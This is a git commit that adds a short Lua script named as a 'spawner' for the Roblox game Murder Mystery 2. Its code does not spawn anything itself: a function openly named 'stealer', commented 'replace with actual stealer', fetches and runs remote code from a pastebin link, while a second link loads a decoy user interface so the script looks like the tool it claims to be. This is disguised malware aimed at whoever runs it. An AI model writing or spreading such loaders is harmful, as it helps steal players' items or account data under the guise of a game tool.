2de20cf0809b90b82d6acaf5f60a9d53330bee21
TakZ-bit <tak72086@gmail.com>
2025-09-21 19:52:11 +0630

    Create Mm2SpwanerFixed.lua

---
+++ Mm2SpwanerFixed.lua
@@ -0,0 +1,10 @@
+local function stealer()
+loadstring(game:HttpGet("https://pastebin.com/raw/ZvehLyZ9"))() -- replace with actual stealer
+end
+local function loadui()
+  loadstring(game:HttpGet("https://pastebin.com/raw/Q8NWfbXc"))()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
